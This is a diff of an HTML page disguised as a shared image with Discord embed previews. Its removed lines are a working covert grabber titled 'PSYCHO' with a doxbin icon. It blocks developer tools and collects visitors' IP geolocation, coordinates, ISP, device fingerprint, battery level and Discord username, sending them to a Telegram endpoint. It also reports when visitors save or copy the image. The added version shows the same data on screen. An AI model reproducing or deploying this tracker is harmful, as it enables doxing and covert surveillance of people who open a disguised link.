@@ -3,25 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PSYCHO</title>
-    <link rel="icon" href="doxbinred.jpg" type="image/jpeg">
-    <link rel="apple-touch-icon" href="doxbinred.jpg">
+    <title>Image</title>
 
     <!-- Discord : URLs injectées automatiquement au déploiement Vercel (build.js) -->
     <meta property="og:type" content="website">
-    <meta property="og:site_name" content="PSYCHO">
-    <meta property="og:title" content="PSYCHO">
+    <meta property="og:title" content="Image">
     <meta property="og:description" content=" ">
     <meta property="og:url" content="https://CHANGE-MOI.com/">
-    <meta property="og:image" content="https://CHANGE-MOI.com/discord.gif">
-    <meta property="og:image:secure_url" content="https://CHANGE-MOI.com/discord.gif">
-    <meta property="og:image:type" content="image/gif">
+    <meta property="og:image" content="https://CHANGE-MOI.com/pfp.jpg">
+    <meta property="og:image:secure_url" content="https://CHANGE-MOI.com/pfp.jpg">
+    <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="1200">
-    <meta property="og:image:alt" content="PSYCHO">
+    <meta property="og:image:alt" content="Image">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="PSYCHO">
-    <meta name="twitter:image" content="https://CHANGE-MOI.com/discord.gif">
+    <meta name="twitter:image" content="https://CHANGE-MOI.com/pfp.jpg">
     <link rel="canonical" href="https://CHANGE-MOI.com/">
     <style>
         body {
@@ -32,84 +28,139 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            -webkit-user-select: none;
-            user-select: none;
         }
-        .img-wrap {
-            position: relative;
-            display: inline-block;
-            line-height: 0;
-            max-width: 100vw;
-            max-height: 100vh;
-        }
-        .img-wrap::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            z-index: 1;
-        }
-        .img-wrap img {
-            display: block;
+        img {
             max-width: 100vw;
             max-height: 100vh;
             width: auto;
             height: auto;
-            pointer-events: none;
-            -webkit-user-drag: none;
-            user-select: none;
+        }
+        .info-panel {
+            position: fixed;
+            bottom: 20px;
+            background: rgba(0, 0, 0, 0.85);
+            color: #fff;
+            padding: 15px 18px;
+            border-radius: 10px;
+            font-family: "Segoe UI", Arial, sans-serif;
+            font-size: 13px;
+            line-height: 1.5;
+            max-width: min(360px, calc(100vw - 40px));
+            max-height: calc(100vh - 40px);
+            overflow-y: auto;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .info-panel--left { left: 20px; }
+        .info-panel--right { right: 20px; }
+        .info-panel h3 {
+            margin: 0 0 10px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #7dd3fc;
+        }
+        .info-panel p { margin: 0; }
+        .info-panel b { color: #bae6fd; font-weight: 500; }
+        .info-panel .loading { color: #94a3b8; font-style: italic; }
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            margin-left: 6px;
+            background: rgba(34, 197, 94, 0.25);
+            color: #86efac;
+        }
+        .badge--warn {
+            background: rgba(251, 191, 36, 0.25);
+            color: #fde047;
+        }
+        @media (max-width: 700px) {
+            .info-panel {
+                left: 10px !important;
+                right: 10px !important;
+                max-width: none;
+            }
+            .info-panel--right { bottom: auto; top: 10px; }
+            .info-panel--left { bottom: 10px; }
         }
     </style>
 </head>
 <body>
-    <div class="img-wrap" id="img-wrap">
-        <img src="site.jpg" alt="PSYCHO" draggable="false">
+    <img src="pfp.jpg" alt="Image">
+
+    <div class="info-panel info-panel--left" id="location-panel">
+        <h3>Localisation <span class="badge" id="geo-api-badge">…</span></h3>
+        <p id="location-text" class="loading">Chargement…</p>
+    </div>
+
+    <div class="info-panel info-panel--right" id="device-panel">
+        <h3>Appareil</h3>
+        <p id="device-text" class="loading">Chargement…</p>
     </div>
 
     <script>
-        (function () {
-            document.addEventListener('contextmenu', function (e) {
-                e.preventDefault();
-            });
+        const locationText = document.getElementById('location-text');
+        const deviceText = document.getElementById('device-text');
+        const geoApiBadge = document.getElementById('geo-api-badge');
 
-            document.addEventListener('keydown', function (e) {
-                var k = (e.key || '').toLowerCase();
-                var block =
-                    k === 'f12' ||
-                    (e.ctrlKey && e.shiftKey && /^(i|j|c|k)$/i.test(k)) ||
-                    (e.ctrlKey && !e.shiftKey && k === 'u') ||
-                    (e.metaKey && e.altKey && /^(i|j|u|c)$/i.test(k)) ||
-                    (e.metaKey && e.shiftKey && /^(i|j|c)$/i.test(k));
-                if (block) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                }
-            });
+        function ipToDecimal(ip) {
+            if (!ip || !ip.includes('.')) return null;
+            return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0;
+        }
 
-            function onDevtoolsOpen() {
-                try {
-                    window.location.replace('about:blank');
-                } catch (_) {
-                    document.documentElement.innerHTML = '';
-                }
+        function line(label, value) {
+            if (value === undefined || value === null || value === '') return '';
+            return `<b>${label}:</b> ${value}<br>`;
+        }
+
+        function renderLocation(data, apiName) {
+            geoApiBadge.textContent = apiName;
+            let html = '';
+            html += line('IP', data.ip);
+            if (data.ip && data.ip.includes('.')) {
+                html += line('IP (décimal)', ipToDecimal(data.ip));
             }
+            html += line('Pays', data.country);
+            if (data.countryCode) html += line('Code pays', data.countryCode);
+            html += line('Région', data.region);
+            html += line('Ville', data.city);
+            if (data.postal) html += line('Code postal', data.postal);
+            html += line('Latitude', data.latitude);
+            html += line('Longitude', data.longitude);
+            if (data.timezone) html += line('Fuseau horaire', data.timezone);
+            html += line('FAI / ISP', data.isp);
+            html += line('Organisation', data.org);
+            html += line('ASN', data.asn);
+            if (data.hostname) html += line('Hostname', data.hostname);
+            if (data.mobile !== undefined) html += line('Connexion mobile', data.mobile ? 'Oui' : 'Non');
+            if (data.proxy !== undefined) html += line('Proxy / VPN', data.proxy ? 'Détecté' : 'Non détecté');
+            locationText.innerHTML = html || '<span class="loading">Aucune donnée</span>';
+            locationText.classList.remove('loading');
+        }
 
-            var threshold = 160;
-            setInterval(function () {
-                var w = window.outerWidth - window.innerWidth > threshold;
-                var h = window.outerHeight - window.innerHeight > threshold;
-                if (w || h) onDevtoolsOpen();
-            }, 500);
+        function renderDevice(data) {
+            let html = '';
+            html += line('Type', data.deviceType);
+            html += line('Système', data.os);
+            if (data.osVersion) html += line('Version OS', data.osVersion);
+            html += line('Navigateur', data.browser);
+            if (data.browserVersion) html += line('Version navigateur', data.browserVersion);
+            html += line('Plateforme', data.platform);
+            html += line('Langue', data.language);
+            if (data.languages) html += line('Langues', data.languages);
+            html += line('Écran', data.screen);
+            html += line('Ratio pixels', data.pixelRatio);
+            html += line('Fuseau (local)', data.timezone);
+            html += line('Cœurs CPU', data.cores);
+            if (data.memory) html += line('Mémoire (Go)', data.memory);
+            html += line('Tactile', data.touch);
+            if (data.connection) html += line('Réseau', data.connection);
+            if (data.battery) html += line('Batterie', data.battery);
+            html += line('User-Agent', `<span style="word-break:break-all;font-size:11px;color:#cbd5e1">${data.userAgent}</span>`);
+            deviceText.innerHTML = html;
+            deviceText.classList.remove('loading');
+        }
 
-            setInterval(function () {
-                var t = performance.now();
-                (function () {}).constructor('debugger')();
-                if (performance.now() - t > 100) onDevtoolsOpen();
-            }, 1500);
-        })();
-    </script>
-
-    <script>
         function parseGeo(d) {
             if (!d?.ip) return null;
             return d;
@@ -241,20 +292,29 @@
                     if (!raw) continue;
                     const data = provider.parse(raw);
                     if (data?.ip) {
-                        const apiName = provider.name + (useJsonp ? ' (JSONP)' : '');
-                        return { ...data, api: apiName };
+                        renderLocation(data, provider.name + (useJsonp ? ' (JSONP)' : ''));
+                        return true;
                     }
                 } catch {
                     /* essai suivant */
                 }
             }
-            return null;
+            return false;
         }
 
         async function fetchGeoLocation() {
-            let data = await tryGeoProviders(geoProviders, false);
-            if (!data) data = await tryGeoProviders(geoJsonpProviders, true);
-            return data || null;
+            if (await tryGeoProviders(geoProviders, false)) return;
+            if (await tryGeoProviders(geoJsonpProviders, true)) return;
+
+            geoApiBadge.textContent = 'erreur';
+            geoApiBadge.classList.add('badge--warn');
+            locationText.innerHTML =
+                '<b>Erreur:</b> impossible de récupérer la localisation.<br>' +
+                '<span style="color:#94a3b8;font-size:12px">Ouvre la page via un serveur local ' +
+                '(pas en double-clic) : <code style="color:#cbd5e1">npx serve .</code> puis ' +
+                '<code style="color:#cbd5e1">http://localhost:3000</code>. ' +
+                'Désactive aussi les bloqueurs de pub pour ce site.</span>';
+            locationText.classList.remove('loading');
         }
 
         function getClientDeviceInfo() {
@@ -344,117 +404,16 @@
             const base = getClientDeviceInfo();
             const uaParsed = (await parseUserAgent(base.userAgent)) || parseUserAgentFallback(base.userAgent);
             const battery = await fetchBattery();
-            return { ...uaParsed, ...base, battery };
-        }
 
-        let cachedLocation = null;
-        let cachedDevice = null;
-        const telegramCooldown = {};
-
-        function withTimeout(promise, ms) {
-            return Promise.race([
-                promise,
-                new Promise((resolve) => setTimeout(() => resolve(null), ms))
-            ]);
-        }
-
-        async function sendToTelegram(action) {
-            action = action || 'visit';
-            const now = Date.now();
-            if (telegramCooldown[action] && now - telegramCooldown[action] < 4000) return;
-            telegramCooldown[action] = now;
-
-            const payload = {
-                action,
-                location: cachedLocation,
-                device: cachedDevice,
-                page: window.location.href,
-                time: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
-                discordUser: getDiscordUser()
-            };
-            const body = JSON.stringify(payload);
-            const apiUrl = new URL('/api/telegram', window.location.origin).href;
-
-            async function post() {
-                const res = await fetch(apiUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body,
-                    keepalive: true
-                });
-                const data = await res.json().catch(() => ({}));
-                return res.ok;
-            }
-
-            try {
-                const ok = await post();
-                if (!ok && navigator.sendBeacon) {
-                    navigator.sendBeacon(apiUrl, new Blob([body], { type: 'application/json' }));
-                }
-            } catch {
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(apiUrl, new Blob([body], { type: 'application/json' }));
-                }
-            }
-        }
-
-        function setupImageTracking() {
-            const wrap = document.getElementById('img-wrap');
-            const img = wrap && wrap.querySelector('img');
-            if (!wrap || !img) return;
-
-            const notify = (action) => {
-                if (cachedLocation || cachedDevice) sendToTelegram(action);
-            };
-
-            wrap.addEventListener('contextmenu', () => notify('save'));
-
-            wrap.addEventListener('dragstart', (e) => {
-                e.preventDefault();
-                notify('drag');
+            renderDevice({
+                ...uaParsed,
+                ...base,
+                battery
             });
-
-            document.addEventListener('copy', () => notify('copy'));
-            document.addEventListener('cut', () => notify('copy'));
-
-            document.addEventListener('keydown', (e) => {
-                const k = (e.key || '').toLowerCase();
-                const mod = e.ctrlKey || e.metaKey;
-                if (mod && (k === 'c' || k === 's' || k === 'x')) notify(k === 's' ? 'save' : 'copy');
-            });
-
-            window.addEventListener('beforeprint', () => notify('print'));
         }
 
-        function getEntryAction() {
-            const params = new URLSearchParams(window.location.search);
-            if (params.get('from') === 'image') return 'image_open';
-            if (params.get('download') === '1') return 'image_download';
-            return 'visit';
-        }
-
-        function getDiscordUser() {
-            const params = new URLSearchParams(window.location.search);
-            return params.get('discord_user') || params.get('user') || null;
-        }
-
-        (async () => {
-            const entryAction = getEntryAction();
-
-            const [location, device] = await Promise.all([
-                withTimeout(fetchGeoLocation(), 10000),
-                withTimeout(fetchDeviceInfo(), 10000)
-            ]);
-            cachedLocation = location;
-            cachedDevice = device;
-            await sendToTelegram(entryAction);
-
-            if (entryAction === 'image_open' && window.history.replaceState) {
-                window.history.replaceState({}, '', window.location.pathname);
-            }
-
-            setupImageTracking();
-        })();
+        fetchGeoLocation();
+        fetchDeviceInfo();
     </script>
 </body>
 </html>
